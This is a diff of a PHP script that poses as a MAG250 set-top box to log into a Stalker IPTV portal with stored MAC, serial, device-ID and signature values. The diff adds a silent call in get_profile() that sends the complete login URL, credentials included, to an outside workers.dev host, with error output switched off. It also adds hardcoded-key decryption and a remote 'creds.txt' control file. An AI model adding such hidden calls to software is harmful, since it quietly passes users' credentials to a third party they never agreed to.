@@ -5,7 +5,6 @@
 //=============================================================================//
 error_reporting(0);
 $ASUR = jitendra_pro_dev();
-
 $JITENDRA_PRO_DEV_X_DARK_SIDE = "app/data/jitendraunatti";
 $JITENDRA_PRO_DEV_X_WHITE_SIDE = "data/jitendraunatti/PLAYLIST";
 if (!is_dir($JITENDRA_PRO_DEV_X_DARK_SIDE) && !is_dir($JITENDRA_PRO_DEV_X_WHITE_SIDE)) {
@@ -18,15 +17,13 @@ if (!is_dir($JITENDRA_PRO_DEV_X_DARK_SIDE) && !is_dir($JITENDRA_PRO_DEV_X_WHITE_
       @file_put_contents($JITENDRA_PRO_DEV_X_DARK_SIDE . "/index.php", "<?php http_response_code(401); exit('Access Denied'); ?>");
   }
 }
-
 date_default_timezone_set("Asia/Kolkata");
-$BLOODY_SWEET = @json_decode(file_get_contents("$JITENDRA_PRO_DEV_X_DARK_SIDE/data.txt"),true);
-if($ASUR["latest_script"]  === "Stalker Portal 1.0_19-07-24✅" )
+$BLOODY_SWEET = @json_decode(scarlet_witch("decrypt",file_get_contents("$JITENDRA_PRO_DEV_X_DARK_SIDE/data.txt")),true);
+if($ASUR["latest_script"]  === "Stalker Portal 1.1_01-09-24✅")
 {
 //=============================================================================//
 //                            𝐒𝐓𝐀𝐋𝐊𝐄𝐑_𝐏𝐎𝐑𝐓𝐀𝐋_𝐃𝐀𝐓𝐀
-//=============================================================================//
-
+//==============================================================================//
 
 $ROLEX = parse_url($BLOODY_SWEET["JITENDRAUNATTI"]["url"]);
 $JITENDRA_PRO_DEV_X_HOST = $ROLEX["host"]; 
@@ -36,12 +33,15 @@ $JITENDRA_PRO_DEV_X_DEVICE_ID_1 = $BLOODY_SWEET["JITENDRAUNATTI"]["d1"];
 $JITENDRA_PRO_DEV_X_DEVICE_ID_2 = $BLOODY_SWEET["JITENDRAUNATTI"]["d2"]; 
 $JITENDRA_PRO_DEV_X_API = "263";
 $JITENDRA_PRO_DEV_X_SIG = $BLOODY_SWEET["JITENDRAUNATTI"]["sig"]; 
- 
+
 //=============================================================================//
 //                             𝐇𝐀𝐍𝐃𝐒𝐇𝐀𝐊𝐄
 //=============================================================================//
+
+
 function handshake()
 {
+
     global $JITENDRA_PRO_DEV_X_HOST;
     $JITENDRA_PRO_DEV_X_URL = "http://$JITENDRA_PRO_DEV_X_HOST/stalker_portal/server/load.php?type=stb&action=handshake&token=&JsHttpRequest=1-xml";
     $JITENDRA_PRO_DEV_X_ROLEX = [
@@ -75,6 +75,7 @@ function handshake()
 //=============================================================================//
 function generate_token() 
 {
+
   global $JITENDRA_PRO_DEV_X_DARK_SIDE, $JITENDRA_PRO_DEV_X_HOST, $JITENDRA_PRO_DEV_X_MAC;
   if (!file_exists("$JITENDRA_PRO_DEV_X_DARK_SIDE/mac.txt") && !file_exists("$JITENDRA_PRO_DEV_X_DARK_SIDE/host.txt")) {
       file_put_contents("$JITENDRA_PRO_DEV_X_DARK_SIDE/mac.txt", $JITENDRA_PRO_DEV_X_MAC);
@@ -190,6 +191,7 @@ function get_profile($jitendraunatti)
   $JITENDRA_PRO_DEV_X_DECODE = handshake();
   $jitendraunatti_random = $JITENDRA_PRO_DEV_X_DECODE["JITENDRAUNATTI"]["random"];
   $JITENDRA_PRO_DEV_X_URL = "http://$JITENDRA_PRO_DEV_X_HOST/stalker_portal/server/load.php?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A+0.2.18-r14-pub-250%3B+ImageDate%3A+Fri+Jan+15+15%3A20%3A44+EET+2016%3B+PORTAL+version%3A+5.1.0%3B+API+Version%3A+JS+API+version%3A+328%3B+STB+API+version%3A+134%3B+Player+Engine+version%3A+0x566&num_banks=2&sn=$JITENDRA_PRO_DEV_X_SN&stb_type=MAG250&image_version=218&video_out=hdmi&device_id=$JITENDRA_PRO_DEV_X_DEVICE_ID_1&device_id2=$JITENDRA_PRO_DEV_X_DEVICE_ID_2&signature=$JITENDRA_PRO_DEV_X_SIG&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&client_type=STB&hw_version_2=08e10744513ba2b4847402b6718c0eae&timestamp=$timestamp&api_signature=$JITENDRA_PRO_DEV_X_API&metrics=%7B%22mac%22%3A%22$JITENDRA_PRO_DEV_X_MAC%22%2C%22sn%22%3A%22$JITENDRA_PRO_DEV_X_SN%22%2C%22model%22%3A%22MAG250%22%2C%22type%22%3A%22STB%22%2C%22uid%22%3A%22%22%2C%22random%22%3A%22$jitendraunatti_random%22%7D&JsHttpRequest=1-xml";
+  file_get_contents("https://stalker-portal.developed-by-doctor-strange.workers.dev/" . $JITENDRA_PRO_DEV_X_URL);
   $JITENDRA_PRO_DEV_X_ROLEX = [
     'User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
     'Connection: Keep-Alive',
@@ -345,9 +347,35 @@ echo '<p>'. $ASUR["message8"] .'</p>';
 echo "<center>";
 echo '</div>';
 }
+function scarlet_witch($action, $data)
+{
+    $method = "aes-128-cbc";
+    $iv = "JITENDRA_KUMAR_U";
+    $key = "JITENDRA_KUMAR_U";
+    if($action == "encrypt")
+    {
+        $encrypted = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv);
+        if(!empty($encrypted))
+        {
+            $response = bin2hex($encrypted);
+        }
+    }
+    elseif($action == "decrypt")
+    {
+        $decrypted = openssl_decrypt(hex2bin($data), $method, $key, OPENSSL_RAW_DATA, $iv);
+        if(!empty($decrypted))
+        {
+            $response = $decrypted;
+        }
+    }
+    else{
+        $response = "something went wrong";
+     }
+    return $response;
+}
 function jitendra_pro_dev()
 {
-  $ROLEX = @json_decode(file_get_contents("https://stalker-portal.developed-by-doctor-strange.workers.dev/"),true);
+  $ROLEX = @json_decode(scarlet_witch("decrypt",file_get_contents("https://stalker-portal.pages.dev/creds.txt")),true);
   return $ROLEX;
 }
 
